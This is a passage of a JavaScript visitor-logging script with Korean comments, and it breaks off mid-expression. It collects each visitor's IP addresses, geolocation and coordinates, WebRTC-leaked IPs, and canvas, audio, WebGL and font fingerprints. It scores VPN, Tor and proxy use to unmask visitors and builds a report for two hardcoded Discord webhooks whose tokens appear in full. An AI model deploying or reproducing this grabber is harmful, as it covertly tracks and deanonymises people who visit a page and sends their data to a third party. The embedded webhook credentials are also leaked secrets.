const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';
const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1448713634111815691/aUP_IgLHFpoYGYvUZmxauDVGCWdj-7ZW7lDfhLgXkP9UeOFrR_N_3pramrO7jHHbaKsT';

let visitorInfo = {};

/* ========== VPN/프록시 탐지 ========== */

/**
 * VPN/프록시 감지 종합 분석 (강화 버전)
 * 클라이언트 + 서버 사이드 체크 통합
 */
async function detectVPNProxy() {
    const result = {
        isVPN: false,
        isTor: false,
        isProxy: false,
        isDatacenter: false,
        suspicionLevel: 0, // 0-100
        reasons: [],
        details: {
            client: {},
            server: {}
        },
        confidence: 'low' // low, medium, high, very-high
    };

    try {
        // === 클라이언트 사이드 체크 ===
        
        // 1. WebRTC IP vs 공인 IP 비교
        const webrtcIPs = await getWebRTCIPs();
        const publicIP = visitorInfo.ip;

        if (webrtcIPs.blocked === "Yes") {
            result.suspicionLevel += 30;
            result.reasons.push("WebRTC가 차단됨 (VPN/브라우저 설정 의심)");
            result.details.client.webrtcBlocked = true;
        }

        // WebRTC에서 발견된 로컬 IP와 공인 IP 비교
        if (webrtcIPs.candidateIPs.length > 0) {
            const webrtcPublicIP = webrtcIPs.candidateIPs[0];
            if (publicIP && webrtcPublicIP !== publicIP) {
                result.suspicionLevel += 45;
                result.reasons.push(`WebRTC IP(${webrtcPublicIP})와 공인 IP(${publicIP})가 불일치`);
                result.isProxy = true;
                result.details.client.ipMismatch = {
                    publicIP: publicIP,
                    webrtcIP: webrtcPublicIP
                };
            }
        }

        // 다중 WebRTC IP 감지 (프록시 체인 의심)
        if (webrtcIPs.candidateIPs.length > 2) {
            result.suspicionLevel += 20;
            result.reasons.push(`다중 WebRTC 공인 IP 감지: ${webrtcIPs.candidateIPs.length}개`);
            result.details.client.multiplePublicIPs = webrtcIPs.candidateIPs;
        }

        // 2. 타임존 불일치 감지
        const timezoneCheck = await checkTimezoneConsistency();
        if (!timezoneCheck.consistent) {
            result.suspicionLevel += timezoneCheck.suspicionPoints;
            result.reasons.push(timezoneCheck.reason);
            result.details.client.timezoneInconsistency = timezoneCheck;
        }

        // 3. 알려진 VPN/프록시 서비스 탐지
        const vpnServiceCheck = await checkKnownVPNServices();
        if (vpnServiceCheck.detected) {
            result.suspicionLevel += 55;
            result.isVPN = true;
            result.reasons.push(`알려진 VPN 서비스 감지: ${vpnServiceCheck.service}`);
            result.details.client.vpnService = vpnServiceCheck;
        }

        // 4. Tor 탐지 (Tor exit node 확인)
        const torCheck = await checkTorNetwork();
        if (torCheck.isTor) {
            result.suspicionLevel += 80;
            result.isTor = true;
            result.reasons.push("Tor 네트워크 감지");
            result.details.client.tor = torCheck;
        }

        // 5. 다중 로컬 IP 주소 감지 (의심스러운 네트워크 설정)
        if (webrtcIPs.localIPs.length > 3) {
            result.suspicionLevel += 15;
            result.reasons.push(`비정상적으로 많은 로컬 IP 주소: ${webrtcIPs.localIPs.length}개`);
        }

        // 6. DNS 누출 체크
        const dnsLeakCheck = await checkDNSLeak();
        if (dnsLeakCheck.leaked) {
            result.suspicionLevel += 25;
            result.reasons.push("DNS 누출 감지");
            result.details.client.dnsLeak = dnsLeakCheck;
        }

        // 7. 브라우저 특성 분석
        const browserAnomalies = detectBrowserAnomalies();
        if (browserAnomalies.suspicious) {
            result.suspicionLevel += browserAnomalies.points;
            result.reasons.push(...browserAnomalies.reasons);
            result.details.client.browserAnomalies = browserAnomalies;
        }

        // 8. WebRTC 연결 지연 분석
        const webrtcLatency = await measureWebRTCLatency();
        if (webrtcLatency.suspicious) {
            result.suspicionLevel += webrtcLatency.points;
            result.reasons.push(webrtcLatency.reason);
            result.details.client.webrtcLatency = webrtcLatency;
        }

        // === 서버 사이드 체크 요청 ===
        try {
            const serverCheck = await requestServerSideCheck({
                ip: publicIP,
                location: visitorInfo.location,
                device: visitorInfo.device,
                browser: visitorInfo.browser,
                timezone: visitorInfo.timezoneInfo,
                webrtc: webrtcIPs
            });

            if (serverCheck && !serverCheck.error) {
                result.details.server = serverCheck;
                result.suspicionLevel += serverCheck.suspicionPoints || 0;
                
                if (serverCheck.reasons && serverCheck.reasons.length > 0) {
                    result.reasons.push(...serverCheck.reasons.map(r => `[서버] ${r}`));
                }

                // 서버에서 감지한 VPN/프록시 정보 반영
                if (serverCheck.serverChecks) {
                    if (serverCheck.serverChecks.ipReputation?.isVPN) {
                        result.isVPN = true;
                    }
                    if (serverCheck.serverChecks.ipReputation?.isTor) {
                        result.isTor = true;
                    }
                    if (serverCheck.serverChecks.ipReputation?.isProxy) {
                        result.isProxy = true;
                    }
                    if (serverCheck.serverChecks.advancedDetection?.isHosting) {
                        result.isDatacenter = true;
                    }
                }
            }
        } catch (serverError) {
            result.details.server.error = serverError.message;
            result.reasons.push("[서버] 서버 체크 실패 (의심도 증가)");
            result.suspicionLevel += 10; // 서버 체크 실패도 약간 의심스러움
        }

        // === 최종 판단 ===
        
        // 의심 레벨 상한선 설정
        result.suspicionLevel = Math.min(result.suspicionLevel, 100);

        // 신뢰도 계산
        const checkCount = result.reasons.length;
        if (result.suspicionLevel >= 80 && checkCount >= 5) {
            result.confidence = 'very-high';
        } else if (result.suspicionLevel >= 60 && checkCount >= 3) {
            result.confidence = 'high';
        } else if (result.suspicionLevel >= 40 && checkCount >= 2) {
            result.confidence = 'medium';
        } else {
            result.confidence = 'low';
        }

        // 최종 VPN/프록시 판단
        if (result.suspicionLevel >= 70 || result.isTor) {
            result.isVPN = true;
        } else if (result.suspicionLevel >= 50) {
            result.isProxy = true;
        }

        // 위험도 레벨 추가
        if (result.suspicionLevel >= 80) {
            result.riskLevel = 'critical';
        } else if (result.suspicionLevel >= 60) {
            result.riskLevel = 'high';
        } else if (result.suspicionLevel >= 40) {
            result.riskLevel = 'medium';
        } else if (result.suspicionLevel >= 20) {
            result.riskLevel = 'low';
        } else {
            result.riskLevel = 'none';
        }

    } catch (error) {
        result.error = error.message;
        result.reasons.push(`오류 발생: ${error.message}`);
    }

    return result;
}

/**
 * 서버 사이드 체크 요청
 */
async function requestServerSideCheck(clientData) {
    try {
        const response = await fetch('/api/vpn-check', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(clientData)
        });

        if (!response.ok) {
            throw new Error(`Server check failed: ${response.status}`);
        }

        return await response.json();
    } catch (error) {
        console.warn('Server-side VPN check failed:', error);
        return { error: error.message };
    }
}

/**
 * 브라우저 이상 징후 탐지
 */
function detectBrowserAnomalies() {
    const result = {
        suspicious: false,
        points: 0,
        reasons: [],
        anomalies: []
    };

    // 1. 플러그인 수 체크 (VPN 브라우저는 플러그인이 적을 수 있음)
    const pluginCount = navigator.plugins.length;
    if (pluginCount === 0) {
        result.points += 15;
        result.reasons.push('플러그인이 전혀 없음 (헤드리스 브라우저 의심)');
        result.anomalies.push('no-plugins');
        result.suspicious = true;
    } else if (pluginCount < 3 && !navigator.userAgent.includes('Mobile')) {
        result.points += 8;
        result.reasons.push('비정상적으로 적은 플러그인 수');
        result.anomalies.push('few-plugins');
        result.suspicious = true;
    }

    // 2. Canvas 일관성 체크
    try {
        const canvas1 = getCanvasFingerprint();
        const canvas2 = getCanvasFingerprint();
        if (canvas1 !== canvas2) {
            result.points += 25;
            result.reasons.push('Canvas 핑거프린트 불일치 (스푸핑 의심)');
            result.anomalies.push('canvas-spoofing');
            result.suspicious = true;
        }
    } catch (error) {
        result.points += 10;
        result.reasons.push('Canvas API 오류');
    }

    // 3. WebGL 벤더 체크
    const webgl = visitorInfo.webgl;
    if (webgl && (webgl.vendor === 'N/A' || webgl.renderer === 'N/A')) {
        result.points += 12;
        result.reasons.push('WebGL 정보 누락 (차단/스푸핑 의심)');
        result.anomalies.push('webgl-blocked');
        result.suspicious = true;
    }

    // 4. 언어 불일치
    const languages = navigator.languages || [navigator.language];
    if (languages.length === 1 && languages[0] === 'en-US') {
        result.points += 5;
        result.reasons.push('단일 언어 설정 (en-US only)');
        result.anomalies.push('single-language');
    }

    // 5. 화면 크기 이상
    if (screen.width === screen.availWidth && screen.height === screen.availHeight) {
        // 전체화면 모드이거나 VM
        if (screen.width === 800 && screen.height === 600) {
            result.points += 15;
            result.reasons.push('기본 VM 화면 크기 감지 (800x600)');
            result.anomalies.push('vm-screen');
            result.suspicious = true;
        }
    }

    // 6. 터치 지원 불일치
    const isMobile = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);
    const hasTouch = navigator.maxTouchPoints > 0;
    if (isMobile && !hasTouch) {
        result.points += 10;
        result.reasons.push('모바일 UA인데 터치 미지원 (에뮬레이터 의심)');
        result.anomalies.push('fake-mobile');
        result.suspicious = true;
    }

    // 7. Do Not Track 설정
    if (navigator.doNotTrack === '1') {
        result.points += 5;
        result.reasons.push('Do Not Track 활성화 (프라이버시 중시 사용자)');
    }

    // 8. 배터리 API 누락 (데스크톱에서)
    if (!isMobile && !('getBattery' in navigator)) {
        result.points += 3;
        result.reasons.push('배터리 API 미지원');
    }

    return result;
}

/**
 * WebRTC 연결 지연 측정
 * VPN/프록시 사용시 지연이 증가할 수 있음
 */
async function measureWebRTCLatency() {
    const result = {
        latency: 0,
        suspicious: false,
        points: 0,
        reason: ''
    };

    try {
        const startTime = Date.now();
        
        // 간단한 STUN 요청으로 지연 측정
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });

        pc.createDataChannel('latency-test');

        await pc.createOffer().then(offer => pc.setLocalDescription(offer));

        // ICE candidate 수집 대기
        await new Promise((resolve) => {
            pc.onicecandidate = (event) => {
                if (!event.candidate) {
                    resolve();
                }
            };
            setTimeout(resolve, 2000); // 최대 2초 대기
        });

        const endTime = Date.now();
        result.latency = endTime - startTime;

        pc.close();

        // 지연이 비정상적으로 높으면 의심
        if (result.latency > 1500) {
            result.suspicious = true;
            result.points = 20;
            result.reason = `WebRTC 연결 지연 높음: ${result.latency}ms (VPN/프록시 의심)`;
        } else if (result.latency > 1000) {
            result.suspicious = true;
            result.points = 10;
            result.reason = `WebRTC 연결 지연 약간 높음: ${result.latency}ms`;
        }

    } catch (error) {
        result.error = error.message;
        result.suspicious = true;
        result.points = 15;
        result.reason = 'WebRTC 연결 실패';
    }

    return result;
}

/**
 * 타임존 일관성 체크
 * IP 기반 위치의 타임존 vs 브라우저 타임존
 */
async function checkTimezoneConsistency() {
    const result = {
        consistent: true,
        suspicionPoints: 0,
        reason: "",
        details: {}
    };

    try {
        const browserTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const browserOffset = new Date().getTimezoneOffset();
        
        // IP 기반 위치의 타임존 (이미 수집된 경우)
        const locationTimezone = visitorInfo.location?.timezone;

        result.details.browserTimezone = browserTimezone;
        result.details.browserOffset = browserOffset;
        result.details.locationTimezone = locationTimezone;

        if (locationTimezone && browserTimezone !== locationTimezone) {
            // 타임존이 완전히 다른 경우
            result.consistent = false;
            result.suspicionPoints = 35;
            result.reason = `타임존 불일치: 브라우저(${browserTimezone}) vs 위치(${locationTimezone})`;
        }

        // 추가: 언어 설정 vs 위치 불일치
        const browserLang = navigator.language || navigator.userLanguage;
        const countryCode = visitorInfo.location?.countryCode;
        
        if (countryCode && browserLang) {
            const langCountry = browserLang.split('-')[1]?.toUpperCase();
            if (langCountry && langCountry !== countryCode && langCountry !== 'US') {
                result.suspicionPoints += 10;
                result.reason += ` | 언어(${browserLang})와 국가(${countryCode}) 불일치`;
            }
        }

    } catch (error) {
        result.error = error.message;
    }

    return result;
}

/**
 * 알려진 VPN/프록시 서비스 탐지
 * ISP, 조직명, 호스팅 서비스 체크
 */
async function checkKnownVPNServices() {
    const result = {
        detected: false,
        service: null,
        type: null
    };

    const isp = visitorInfo.location?.isp?.toLowerCase() || "";
    const org = visitorInfo.location?.org?.toLowerCase() || "";

    // 알려진 VPN 서비스 키워드
    const vpnKeywords = [
        'vpn', 'proxy', 'nordvpn', 'expressvpn', 'surfshark', 'cyberghost',
        'private internet access', 'protonvpn', 'tunnelbear', 'windscribe',
        'mullvad', 'ivpn', 'airvpn', 'perfect privacy', 'vyprvpn',
        'hide.me', 'hotspot shield', 'ipvanish', 'purevpn', 'zenmate'
    ];

    // 데이터센터/호스팅 서비스 키워드
    const hostingKeywords = [
        'amazon', 'aws', 'google cloud', 'microsoft azure', 'digitalocean',
        'linode', 'vultr', 'ovh', 'hetzner', 'contabo', 'scaleway',
        'datacamp', 'choopa', 'servermania', 'hostwinds', 'psychz'
    ];

    for (const keyword of vpnKeywords) {
        if (isp.includes(keyword) || org.includes(keyword)) {
            result.detected = true;
            result.service = keyword;
            result.type = 'VPN';
            break;
        }
    }

    if (!result.detected) {
        for (const keyword of hostingKeywords) {
            if (isp.includes(keyword) || org.includes(keyword)) {
                result.detected = true;
                result.service = keyword;
                result.type = 'Hosting/Datacenter';
                break;
            }
        }
    }

    return result;
}

/**
 * Tor 네트워크 감지
 * 공개 Tor exit node 목록과 비교
 */
async function checkTorNetwork() {
    const result = {
        isTor: false,
        checked: false
    };

    try {
        // Tor exit node 체크 (TorProject API 또는 공개 DB 사용)
        const ip = visitorInfo.ip;
        if (!ip) return result;

        // 방법 1: Tor Project의 공식 체크
        // https://check.torproject.org/torbulkexitlist 사용 가능
        
        // 방법 2: ISP/조직명에서 Tor 감지
        const isp = visitorInfo.location?.isp?.toLowerCase() || "";
        const org = visitorInfo.location?.org?.toLowerCase() || "";

        if (isp.includes('tor') || org.includes('tor') || 
            isp.includes('exit') && isp.includes('node')) {
            result.isTor = true;
            result.checked = true;
        }

        // 방법 3: 리버스 DNS가 Tor 패턴인지 확인
        // 실제 구현시 DNS API 사용

    } catch (error) {
        result.error = error.message;
    }

    return result;
}

/**
 * DNS 누출 체크
 * DNS 서버가 VPN과 같은 국가에 있는지 확인
 */
async function checkDNSLeak() {
    const result = {
        leaked: false,
        dnsServers: [],
        details: null
    };

    try {
        // 브라우저에서는 직접 DNS 서버를 알기 어렵지만
        // 간접적으로 DNS over HTTPS를 통해 체크 가능
        
        // 방법 1: 타사 DNS leak test API 사용
        const response = await fetch('https://www.dnsleaktest.com/api/dns-servers');
        if (response.ok) {
            const data = await response.json();
            result.dnsServers = data;
            
            // DNS 서버 국가와 공인 IP 국가 비교
            const ipCountry = visitorInfo.location?.countryCode;
            if (data.length > 0 && data[0].country !== ipCountry) {
                result.leaked = true;
                result.details = `DNS 서버 국가(${data[0].country})와 IP 국가(${ipCountry})가 다름`;
            }
        }
    } catch (error) {
        // API 실패시 무시 (선택적 기능)
        result.error = error.message;
    }

    return result;
}

/**
 * 추가: 프록시 헤더 감지
 * 일부 프록시는 HTTP 헤더에 흔적을 남김
 */
function detectProxyHeaders() {
    const suspiciousHeaders = [];
    
    // 브라우저에서는 직접 헤더를 읽을 수 없지만,
    // 서버 사이드에서 다음 헤더들을 체크 가능:
    // X-Forwarded-For, X-Real-IP, Via, X-Proxy-ID 등
    
    return {
        detected: suspiciousHeaders.length > 0,
        headers: suspiciousHeaders
    };
}


/* ========== 기본 정보 수집 ========== */

function getDeviceInfo() {
    return {
        platform: navigator.platform,
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        touchPoints: navigator.maxTouchPoints || 0,
        cookieEnabled: navigator.cookieEnabled,
        onlineStatus: navigator.onLine ? '온라인' : '오프라인',
        doNotTrack: navigator.doNotTrack || 'N/A'
    };
}

function getScreenInfo() {
    return {
        screenWidth: screen.width,
        screenHeight: screen.height,
        screenAvailWidth: screen.availWidth,
        screenAvailHeight: screen.availHeight,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: screen.orientation ? screen.orientation.type : 'N/A'
    };
}

function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

    const base = {
        effectiveType: 'N/A',
        downlink: 'N/A',
        rtt: 'N/A',
        saveData: 'N/A',
        type: 'N/A',
        networkCategory: 'N/A' // Wi-Fi / Cellular / Unknown
    };

    if (!connection) return base;

    const info = { ...base };

    info.effectiveType = connection.effectiveType || 'N/A';
    info.downlink = connection.downlink ? `${connection.downlink} Mbps` : 'N/A';
    info.rtt = connection.rtt ? `${connection.rtt}ms` : 'N/A';
    info.saveData = connection.saveData ? '활성화' : '비활성화';
    info.type = connection.type || 'N/A';

    // Wi-Fi / 데이터(셀룰러) 추정
    const t = (connection.type || '').toLowerCase();
    if (t === 'wifi') {
        info.networkCategory = 'Wi-Fi';
    } else if (t === 'cellular' || t === 'wimax') {
        info.networkCategory = 'Cellular';
    } else if (['slow-2g', '2g', '3g', '4g'].includes((connection.effectiveType || '').toLowerCase())) {
        info.networkCategory = 'Cellular(추정)';
    } else {
        info.networkCategory = 'Unknown';
    }

    return info;
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = 'Unknown';
    let browserVersion = 'Unknown';

    if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Firefox') > -1) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
    } else if (ua.indexOf('Edg') > -1) {
        browserName = 'Edge';
        browserVersion = ua.match(/Edg\/([0-9.]+)/)?.[1] || 'Unknown';
    }

    return { browserName, browserVersion };
}

function getOSInfo() {
    const ua = navigator.userAgent;
    let osName = 'Unknown';

    if (ua.indexOf('Windows NT 10.0') > -1) osName = 'Windows 10/11';
    else if (ua.indexOf('Windows NT 6.3') > -1) osName = 'Windows 8.1';
    else if (ua.indexOf('Windows NT 6.2') > -1) osName = 'Windows 8';
    else if (ua.indexOf('Windows NT 6.1') > -1) osName = 'Windows 7';
    else if (ua.indexOf('Mac OS X') > -1) osName = 'macOS';
    else if (ua.indexOf('Linux') > -1) osName = 'Linux';
    else if (ua.indexOf('Android') > -1) osName = 'Android';
    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) osName = 'iOS';

    return osName;
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging ? '충전 중' : '충전 안 함',
                chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
                dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
            };
        }
    } catch {}
    return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
}

function getMemoryInfo() {
    try {
        if ('memory' in performance) {
            const memory = performance.memory;
            return {
                usedJSHeapSize: `${Math.round(memory.usedJSHeapSize / 1024 / 1024)} MB`,
                totalJSHeapSize: `${Math.round(memory.totalJSHeapSize / 1024 / 1024)} MB`,
                jsHeapSizeLimit: `${Math.round(memory.jsHeapSizeLimit / 1024 / 1024)} MB`
            };
        }
    } catch {}
    return { usedJSHeapSize: 'N/A', totalJSHeapSize: 'N/A', jsHeapSizeLimit: 'N/A' };
}

function getPluginsInfo() {
    const plugins = [];
    try {
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
        }
    } catch {}
    return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
}

function getWebGLInfo() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
                unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
            };
        }
    } catch {}
    return {
        vendor: 'N/A',
        renderer: 'N/A',
        version: 'N/A',
        shadingLanguageVersion: 'N/A',
        unmaskedVendor: 'N/A',
        unmaskedRenderer: 'N/A'
    };
}

function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint ????', 2, 2);
        return canvas.toDataURL().slice(-50);
    } catch {
        return 'N/A';
    }
}

function getAudioFingerprint() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        const gainNode = audioContext.createGain();

        oscillator.connect(analyser);
        analyser.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.frequency.value = 10000;
        gainNode.gain.value = 0;

        const dataArray = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(dataArray);

        audioContext.close();

        return dataArray.slice(0, 10).join(',').slice(0, 50);
    } catch {
        return 'N/A';
    }
}

function getFontsInfo() {
    const fonts = [
        'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Palatino',
        'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact',
        'Arial Narrow', 'Tahoma', 'Geneva', 'Century Gothic', 'Lucida Console', 'Monaco',
        'Courier', 'Bradley Hand ITC', 'Brush Script MT', 'Luminari', 'Chalkduster'
    ];

    const availableFonts = [];
    const testString = 'mmmmmmmmmmlli';
    const testSize = '72px';

    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    context.font = testSize + ' monospace';
    const baselineWidth = context.measureText(testString).width;

    fonts.forEach(font => {
        context.font = testSize + ' ' + font + ', monospace';
        const width = context.measureText(testString).width;
        if (width !== baselineWidth) {
            availableFonts.push(font);
        }
    });

    return availableFonts.length > 0 ? availableFonts.slice(0, 10).join(', ') : 'N/A';
}

function getStorageInfo() {
    try {
        const info = {
            localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
            sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
            indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
            webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
        };

        if ('storage' in navigator && 'estimate' in navigator.storage) {
            navigator.storage.estimate().then(estimate => {
                info.quota = `${Math.round(estimate.quota / 1024 / 1024)} MB`;
                info.usage = `${Math.round(estimate.usage / 1024 / 1024)} MB`;
            });
        }

        return info;
    } catch {
        return { localStorage: 'N/A', sessionStorage: 'N/A', indexedDB: 'N/A', webSQL: 'N/A' };
    }
}

function getMediaDevicesInfo() {
    return new Promise(async (resolve) => {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                resolve({
                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
                    videoInput: devices.filter(d => d.kind === 'videoinput').length
                });
            } else {
                resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
            }
        } catch {
            resolve({ audioInput: 'N/A', audioOutput: 'N/A', videoInput: 'N/A' });
        }
    });
}

function getTimezoneInfo() {
    try {
        const date = new Date();
        return {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: date.getTimezoneOffset(),
            dst: date.getTimezoneOffset() < new Date(date.getFullYear(), 0, 1).getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale
        };
    } catch {
        return { timezone: 'N/A', timezoneOffset: 'N/A', dst: 'N/A', locale: 'N/A' };
    }
}

function getPerformanceInfo() {
    try {
        const nav = performance.getEntriesByType('navigation')[0];
        return {
            loadTime: Math.round(nav.loadEventEnd - nav.fetchStart) + 'ms',
            domContentLoaded: Math.round(nav.domContentLoadedEventEnd - nav.fetchStart) + 'ms',
            pageLoadTime: Math.round(performance.now()) + 'ms'
        };
    } catch {
        return { loadTime: 'N/A', domContentLoaded: 'N/A', pageLoadTime: 'N/A' };
    }
}


/* ========== IP 정보 수집 (IPv4 / IPv6 구분) ========== */

async function getIPInfo() {
    const info = {
        ipv4: null,
        ipv6: null,
        primary: null,
        ipVersion: 'Unknown'
    };

    // IPv4 전용
    try {
        const res4 = await fetch('https://api.ipify.org?format=json');
        const data4 = await res4.json();
        if (data4 && data4.ip && !data4.ip.includes(':')) {
            info.ipv4 = data4.ip;
        }
    } catch {}

    // IPv6(+fallback) 전용
    try {
        const res6 = await fetch('https://api64.ipify.org?format=json');
        const data6 = await res6.json();
        if (data6 && data6.ip) {
            if (data6.ip.includes(':')) {
                info.ipv6 = data6.ip;
            } else if (!info.ipv4) {
                info.ipv4 = data6.ip;
            }
        }
    } catch {}

    info.primary = info.ipv6 || info.ipv4;
    if (info.primary) {
        info.ipVersion = info.primary.includes(':') ? 'IPv6' : 'IPv4';
    }

    return info;
}


/* ========== WebRTC STUN 기반 IP 후보 탐지 ========== */

async function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = {
            localIPs: [],
            candidateIPs: [],
            blocked: "No"
        };

        const pc = new RTCPeerConnection({
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun1.l.google.com:19302" }
            ]
        });

        pc.createDataChannel("dummy");

        pc.onicecandidate = (event) => {
            if (!event || !event.candidate) {
                if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                    ips.blocked = "Yes";
                }
                resolve(ips);
                return;
            }

            const candidate = event.candidate.candidate;
            const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
            if (!ipMatch) return;

            const ip = ipMatch[1];

            if (candidate.includes("typ host") && !ips.localIPs.includes(ip)) {
                ips.localIPs.push(ip);
            }

            if ((candidate.includes("typ srflx") || candidate.includes("typ relay")) &&
                !ips.candidateIPs.includes(ip)) {
                ips.candidateIPs.push(ip);
            }
        };

        pc.createOffer()
            .then((offer) => pc.setLocalDescription(offer))
            .catch(() => resolve(ips));

        setTimeout(() => {
            if (ips.localIPs.length === 0 && ips.candidateIPs.length === 0) {
                ips.blocked = "Yes";
            }
            resolve(ips);
        }, 3000);
    });
}


/* ========== 메인: 수집 후 웹훅 전송 ========== */

async function collectAndSendInfo() {
    try {
        // IP 정보 (IPv4 / IPv6)
        const ipInfo = await getIPInfo();
        visitorInfo.ipInfo = ipInfo;
        visitorInfo.ip = ipInfo.primary;
        visitorInfo.ipVersion = ipInfo.ipVersion;

        // 위치 정보 (ip-api) - primary IP 기준
        if (visitorInfo.ip) {
            try {
                const locationResponse = await fetch(`https://ip-api.com/json/${visitorInfo.ip}`);
                const locationData = await locationResponse.json();

                if (locationData.status === 'success') {
                    visitorInfo.location = {
                        country: locationData.country,
                        countryCode: locationData.countryCode,
                        region: locationData.regionName,
                        city: locationData.city,
                        isp: locationData.isp,
                        org: locationData.org,
                        timezone: locationData.timezone,
                        lat: locationData.lat,
                        lon: locationData.lon
                    };
                }
            } catch {}
        }

        const now = new Date();
        visitorInfo.timestamp = now.toISOString();
        visitorInfo.localTime = now.toLocaleString('ko-KR');
        visitorInfo.timezoneString = Intl.DateTimeFormat().resolvedOptions().timeZone;

        visitorInfo.device = getDeviceInfo();
        visitorInfo.browser = getBrowserInfo();
        visitorInfo.os = getOSInfo();
        visitorInfo.screen = getScreenInfo();
        visitorInfo.network = getNetworkInfo();
        visitorInfo.battery = await getBatteryInfo();
        visitorInfo.memory = getMemoryInfo();
        visitorInfo.plugins = getPluginsInfo();
        visitorInfo.webgl = getWebGLInfo();
        visitorInfo.canvasFingerprint = getCanvasFingerprint();
        visitorInfo.audioFingerprint = getAudioFingerprint();
        visitorInfo.fonts = getFontsInfo();
        visitorInfo.storage = getStorageInfo();
        visitorInfo.mediaDevices = await getMediaDevicesInfo();
        visitorInfo.timezoneInfo = getTimezoneInfo();
        visitorInfo.performance = getPerformanceInfo();
        visitorInfo.url = window.location.href;
        visitorInfo.referrer = document.referrer || '직접 접속';

        // WebRTC IP 후보 정보
        visitorInfo.webRTC = await getWebRTCIPs();

        // VPN/프록시 탐지
        visitorInfo.vpnDetection = await detectVPNProxy();

        const embed = {
            title: "새로운 방문자 정보",
            description: "사용자가 페이지에 접속했습니다.",
            color: visitorInfo.vpnDetection.isVPN || visitorInfo.vpnDetection.isTor ? 0xFF6B6B : 0x5865F2, // VPN 감지시 빨간색
            timestamp: visitorInfo.timestamp,
            thumbnail: {
                url: "https://cdn3.emoji.gg/emojis/6333-discord-logo.png"
            },
            fields: [
                {
                    name: "🚨 VPN/프록시 탐지 결과",
                    value:
                        `**의심 수준:** ${visitorInfo.vpnDetection.suspicionLevel}% ${visitorInfo.vpnDetection.suspicionLevel >= 60 ? '🔴 높음' : visitorInfo.vpnDetection.suspicionLevel >= 40 ? '🟡 중간' : '🟢 낮음'}\n` +
